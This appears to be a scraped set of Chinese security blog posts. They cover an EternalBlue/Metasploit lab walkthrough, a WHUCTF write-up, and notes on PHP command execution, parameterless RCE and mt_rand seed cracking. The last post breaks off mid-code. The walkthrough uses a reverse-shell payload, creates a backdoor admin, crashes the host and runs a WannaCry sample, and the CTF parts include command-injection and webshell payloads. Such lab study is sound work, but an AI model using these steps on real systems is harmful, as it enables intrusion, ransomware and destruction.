<h4 id="对象clone"><a href="#对象clone" class="headerlink" title="对象clone"></a>对象clone</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>(obj)&#123;</span><br><span class="line">    <span class="built_in">return</span> merge(&#123;&#125;,obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="按路径定义属性"><a href="#按路径定义属性" class="headerlink" title="按路径定义属性"></a>按路径定义属性</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theFunction(obj,path,value)</span><br></pre></td></tr></table></figure>
<p>如果path参数可控，就可以通过修改__proto__.value的值从而改变Object的属性，达到污染原型链的目的。</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>EternalBlue</title>
    <url>/post/9018b838.html</url>
    <content><![CDATA[<p>攻击机：Kali<br>靶机：Win7<br>这里的靶机ip地址为192.168.1.106<br>靶机需要打开位于 控制面板-&gt;网络和Internet-&gt;网络和共享中心-&gt;高级共享设置 中的启用网络发现和启用文件和打印机共享</p>
<h3 id="测试靶机是否有永恒之蓝漏洞"><a href="#测试靶机是否有永恒之蓝漏洞" class="headerlink" title="测试靶机是否有永恒之蓝漏洞"></a>测试靶机是否有永恒之蓝漏洞</h3><p>靶机需要满足开启445端口，使用Nmap端口扫描<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.106</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_0.jpg" alt=""><br>靶机开启了139和445端口，就可以进行测试了</p>
<h3 id="使用Metasploit利用永恒之蓝漏洞对靶机进行渗透"><a href="#使用Metasploit利用永恒之蓝漏洞对靶机进行渗透" class="headerlink" title="使用Metasploit利用永恒之蓝漏洞对靶机进行渗透"></a>使用Metasploit利用永恒之蓝漏洞对靶机进行渗透</h3><p>在Kali中打开Metasploit<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><br>搜索ms17-010,永恒之蓝漏洞的exp<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_1.jpg" alt=""><br>第三个就是要找的exp，使用这个exp<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure><br>查看一下需要配置那些参数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_2.jpg" alt=""><br>发现RHOSTS还没有配置，配置RHOSTS,也就是靶机的ip<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.1.106</span><br></pre></td></tr></table></figure><br>配置payload,先查询一下有哪些可用的payload<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_3.jpg" alt=""><br>这里需要找一个可以反向连接的payload,第15条就可以<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><br>查看一下需要配置那些参数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_4.jpg" alt=""><br>需要配置LHOST,也就是攻击机的ip地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost 192.168.1.107</span><br></pre></td></tr></table></figure><br>执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit 或者 run</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_5.jpg" alt=""><br>攻击成功，接下来就可对靶机进行操作了，在开始前已经在靶机的桌面建了一个win7.txt的文件，尝试去把它下载到本地<br>将目录切换到桌面<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_6.jpg" alt=""><br>将win7.txt文件下载到本地<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">download win7.txt</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_7.jpg" alt=""><br>还可以进行提权，先进入windows的命令行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><br>查看所有的用户<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><br>创建一个新用户hacker,密码为123456<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net user hacker 123456 /add</span><br></pre></td></tr></table></figure><br>将该普通用户提权为管理员用户<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net localgroup Administrators hacker /add</span><br></pre></td></tr></table></figure><br>删除原来的管理员用户w1ndy<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net user w1ndy /del</span><br></pre></td></tr></table></figure><br>kill掉wininit.exe进程，直接打蓝屏，重启一下就好了<br>``bash<br>taskkill /f /im wininit.exe<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">还有很多命令可以执行，可以使用&quot;help&quot;这个命令来查看</span><br><span class="line">比如，截屏命令</span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">screenshot</span><br></pre></td></tr></table></figure></p>
<h3 id="渗透成功后上传WannaCry勒索软件"><a href="#渗透成功后上传WannaCry勒索软件" class="headerlink" title="渗透成功后上传WannaCry勒索软件"></a>渗透成功后上传WannaCry勒索软件</h3><p>永恒之蓝病毒样本：<a href="https://bbs.pediy.com/thread-217586.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-217586.htm</a><br>将wcry2文件夹上传到靶机的C盘下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload wcry2 c:/</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_8.jpg" alt=""><br>用shell命令切换到win7的终端运行该病毒<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wcry.exe</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_9.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_10.jpg" alt=""></p>
<p>Meterpreter常用命令<br><a href="https://www.cnblogs.com/wjw-zm/p/11688992.html" target="_blank" rel="noopener">https://www.cnblogs.com/wjw-zm/p/11688992.html</a><br><a href="https://www.cnblogs.com/maohai-kdg/p/12915718.html" target="_blank" rel="noopener">https://www.cnblogs.com/maohai-kdg/p/12915718.html</a></p>
<h3 id="利用rdesktop远程连接靶机桌面"><a href="#利用rdesktop远程连接靶机桌面" class="headerlink" title="利用rdesktop远程连接靶机桌面"></a>利用rdesktop远程连接靶机桌面</h3><p>连接之前需要一个靶机的账户，开启靶机的3389端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">'%COMPUTERNAME%'</span> call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><br>该命令就可开启靶机的3389端口<br>将靶机的3389端口转发到本地的6666端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_11.jpg" alt=""><br>接下来就可以用rdesktop连接靶机了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop 127.0.0.1:6666</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_12.jpg" alt=""><br>连接成功后就会弹出登陆界面<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_13.jpg" alt=""><br>登陆即可</p>
<p>针对win xp还可以利用ms08-067漏洞</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>WHUCTF</title>
    <url>/post/7ad3a98.html</url>
    <content><![CDATA[<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="variable">$string_1</span> = <span class="variable">$_GET</span>[<span class="string">'str1'</span>];</span><br><span class="line"><span class="variable">$string_2</span> = <span class="variable">$_GET</span>[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line">//1st</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, <span class="variable">$_GET</span>[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'会代码审计嘛23333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//2nd</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$string_1</span>))&#123;</span><br><span class="line">    <span class="variable">$md5_1</span> = md5(<span class="variable">$string_1</span>);</span><br><span class="line">    <span class="variable">$md5_2</span> = md5(<span class="variable">$string_2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$md5_1</span> != <span class="variable">$md5_2</span>)&#123;</span><br><span class="line">        <span class="variable">$a</span> = strtr(<span class="variable">$md5_1</span>, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="variable">$b</span> = strtr(<span class="variable">$md5_2</span>, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="variable">$b</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//3nd</span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$string</span>)&#123;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="string">"aaaaa"</span>;</span><br><span class="line"><span class="variable">$user</span> = array(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$r</span> = filter(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">if</span>(unserialize(<span class="variable">$r</span>)[1] == <span class="string">"123456"</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一关：利用%0a绕过(%0a经过url编码后时回车)<br>第二关：0e绕过(找到两个数，md5后都是0e开头的就可)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$count</span> = 0;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = 1; <span class="variable">$i</span> &lt;= 100000000; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$md5</span> = strtr(md5(<span class="variable">$i</span>), <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^0e\d+$/'</span>, <span class="variable">$md5</span>)) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$i</span> . <span class="string">" "</span> . md5(<span class="variable">$i</span>) . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="variable">$count</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$count</span> == 2) &#123;</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str1=11230178&amp;str2=20493141</span><br></pre></td></tr></table></figure><br>第三关：php反序列化字符逃逸<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$string</span>)&#123;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">'123456xxxxxxxxxxxxxxxxxxxx";i:1;s:6:"123456";&#125;'</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">"aaaaa"</span>;</span><br><span class="line"><span class="variable">$user</span> = array(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$r</span> = filter(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$user</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$r</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/whuctf_serialize.jpg" alt=""><br>下面是最终payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num=2333%0a&amp;str1=11230178&amp;str2=20493141</span><br><span class="line">以post方式传入username=123456xxxxxxxxxxxxxxxxxxxx<span class="string">";i:1;s:6:"</span>123456<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><br>在源码中就可发现flag</p>
<h4 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h4><p>打开链接啥也没有，源码中啥也没有，扫了下目录，发现有个index,下载下来里面就有flag,感觉是非预期，这应该是出题人疏忽了吧，也没用到题目中所说的命令执行，index文件内容如下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd0.jpg" alt=""><br>最后题目修复了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd1.jpg" alt=""><br>扫一下目录<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=1;ls</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd2.jpg" alt=""><br>题目过滤了许多关键词，需要绕过来读取flag.php<br>od命令：<a href="https://www.cnblogs.com/cxgg/p/9165062.html" target="_blank" rel="noopener">https://www.cnblogs.com/cxgg/p/9165062.html</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=1;a=lag.php;b=f;od<span class="variable">$IFS</span><span class="variable">$1</span>-tc<span class="variable">$IFS</span><span class="variable">$1</span><span class="variable">$b</span><span class="variable">$a</span></span><br></pre></td></tr></table></figure><br>或者用ca$@t来替换cat命令也可以读取flag.php<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=1;a=lag.php;b=f;ca<span class="variable">$@t</span><span class="variable">$IFS</span><span class="variable">$1</span><span class="variable">$b</span><span class="variable">$a</span></span><br></pre></td></tr></table></figure><br>然后在源码中会发现flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd3.jpg" alt=""></p>
<h4 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include0.jpg" alt=""><br>随便写点提交<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include1.jpg" alt=""><br>看见thankyou.php,盲猜flag.php,直接伪协议读取<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include2.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PD9waHANCg0KLy9mbGFnPXdodWN0ZntOMHdfeTB1X2tuMHdfZmlsZV9pbmNsdXNpb259DQoNCg==</span><br></pre></td></tr></table></figure><br>base64解码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag=whuctf&#123;N0w_y0u_kn0w_file_inclusion&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id=""><a href="#" class="headerlink" title=" "></a> </h4><h3 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h3><h4 id="智能合约-那是啥"><a href="#智能合约-那是啥" class="headerlink" title="智能合约? 那是啥"></a>智能合约? 那是啥</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x202E653dA93c2a06076FC95B0A07E39B6003C5f6 Ropsten</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * The CoinFlip contract does nothing...</span><br><span class="line"> */</span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">	uint256 lashHash;</span><br><span class="line">	uint256 Factor = 20244007718664171871063861089;</span><br><span class="line">    mapping (address =&gt; uint) balances;</span><br><span class="line">    string flag;</span><br><span class="line"></span><br><span class="line">	constructor (string _flag) public &#123;</span><br><span class="line">		flag = _flag;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> getBalance () public returns(uint) &#123;</span><br><span class="line">		<span class="built_in">return</span> balances[tx.origin];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">		uint256 blockValue = uint256(block.blockhash(block.number - 1));</span><br><span class="line">		lashHash = blockValue;</span><br><span class="line">		uint256 ans = blockValue / Factor;</span><br><span class="line">		bool side = ans == 1 ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">			balances[tx.origin]++;</span><br><span class="line">			<span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			balances[tx.origin] = 0;</span><br><span class="line">			<span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> GetTheFlag() public view returns (string)&#123;</span><br><span class="line">		<span class="built_in">return</span> flag;  // You can get your flag here</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译一下，点击GetTheFlag就会输出flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Smart_contract/WHUCTF_1/1.jpg" alt=""></p>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="佛系青年BingGe"><a href="#佛系青年BingGe" class="headerlink" title="佛系青年BingGe"></a>佛系青年BingGe</h4><p>我看见我的朋友BingGe坐在信部网球场的栅栏边上看一本佛经，我很好奇，也过去看，只见上面写着: 佛曰：般羅穆僧冥神大侄所隸奢尼哆恐侄大藐若故曳咒室呐阿竟諳他缽悉爍諦哆咒豆苦缽尼帝所冥等上哆瑟俱薩諸諳伊冥特諳實怯他罰不參亦皤有婆僧藝俱羯怯至皤滅知真哆訶亦能怯瑟梵陀奢知呼故梵夢死有皤能薩曰俱穆勝竟怯明奢參世缽佛皤羯瑟奢孕梵逝楞呐醯故奢想謹提諦盡侄阿哆利俱吉罰老謹涅神能皤集實輸奢薩奢數哆波者俱勝俱所遠盡呐倒利闍盧諦罰薩梵曰度提大諦哆穆輸醯怯參侄諸娑梵伽知勝穆伊顛冥參道冥有<br>第一步与佛论禅解密<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">767566536773bf1ef643676363676784e1d015847635575637560ff4f41d</span><br></pre></td></tr></table></figure><br>尝试转ASCII，转换失败，题目中说到栅栏，栅栏解密，当为6栏时<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">7768756374667b6e305f315f616d5f6e30745f615f36756464683173747d</span><br></pre></td></tr></table></figure><br>转ASCII成功whuctf{n0_1_am_n0t_a_6uddh1st}</p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Bivibivi"><a href="#Bivibivi" class="headerlink" title="Bivibivi"></a>Bivibivi</h4><p>Do you know B-site?<br>nc 218.197.154.9 16387<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc0.jpg" alt=""><br>第一步就直接模逆运算，然后就没啥了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc1.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc2.jpg" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web-WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/post/cf64b99a.html</url>
    <content><![CDATA[<p>Web应用有时需要调用一些可以执行系统命令的函数<br>常用的PHP命令执行函数：system、exec、shell_exec、passthru、popen、proc_popen等<br>当用户能够控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，即命令执行漏洞<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;       前面的执行完执行后面的</span><br><span class="line">|       管道符，前面执行结果的输出作为后面的输入</span><br><span class="line">||      当前面的执行出错时执行后面的</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>无参函数RCE</title>
    <url>/post/a2f93219.html</url>
    <content><![CDATA[<p>由于eval()函数允许执行任意php代码，这就会造成远程代码执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'shell'</span>]);</span><br></pre></td></tr></table></figure><br>即一句话木马，就可以getshell了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">'shell'</span>]=system(<span class="string">'ls /'</span>);</span><br><span class="line"><span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'shell'</span>]);等同于<span class="built_in">eval</span>(system(<span class="string">'ls /'</span>));</span><br></pre></td></tr></table></figure><br>但是如果正则只允许使用不带参数的函数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/[^\W]+\((?R)?\)/</span><br></pre></td></tr></table></figure><br>那么就需要利用一些特殊作用不带参数的函数</p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>localeconv() ：返回包含本地数字及货币格式信息的数组<br>current()、pos() ： 返回数组中的当前单元, 默认取第一个值<br>current(localeconv()) : 只会返回一个点’.’<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(localeconv());</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">print_r(current(localeconv()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/RCE/rce0.jpg" alt=""><br>scandir() ：列出目录中的文件和目录<br>getcwd() ：获得当前目录<br>chdir() ：函数把当前的目录改变为指定的目录<br>highlight_file()、show_source() ：打印输出或者返回文件中语法高亮的代码<br>readfile() ：读取文件并写入到输出缓冲，输出文件<br>array_reverse() ：以相反的元素顺序返回数组<br>next() ：函数将内部指针指向数组中的下一个元素，并输出<br>end() ：将数组的内部指针指向最后一个单元<br>key() ：从关联数组中取得键名<br>prev() ：将数组的内部指针指向第一个单元<br>reset() ：将数组的内部指针指向第一个单元<br>array_rand() ：从数组中随机取出一个或多个单元，不断刷新总能刷新到想要访问的单元<br>array_flip() ：交换数组的键和值<br>session_id(session_start()) ：session_id()可以获取当前的session id,session_start()是来告诉PHP使用session,因为PHP默认是不主动使用session的</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>[GXYCTF2019]禁止套娃: <a href="https://zxfireworks.xyz/2020/03/14/BUUCTF-Web/" target="_blank" rel="noopener">https://zxfireworks.xyz/2020/03/14/BUUCTF-Web/</a></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>php伪随机数</title>
    <url>/post/ee108238.html</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(100);</span><br><span class="line"><span class="built_in">echo</span> mt_rand().<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">mt_srand(100);</span><br><span class="line"><span class="built_in">echo</span> mt_rand().<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>上述代码中产生随机数的种子为100，两段同样的代码，输出如下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/fake_random/php_mt_rand3.jpg" alt=""><br>很明显两次输出的结果是一样的，这就出现了问题，意味着可以通过结果去算出种子<br>这里要用到工具php_mt_seed，使用这个工具利用种子产生的第一个伪随机数可以还原出原始的种子<br>注意：这里选取的伪随机数必须是第一个</p>
<h3 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/fake_random/fakerandom.jpg" alt=""><br>查看源码，发现check.php<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'seed'</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'seed'</span>]=rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">'seed'</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">''</span>;</span><br><span class="line"><span class="variable">$len1</span>=20;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(0, strlen(<span class="variable">$str_long1</span>) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, 0, 10);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.<span class="variable">$str_show</span>.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">'num'</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span 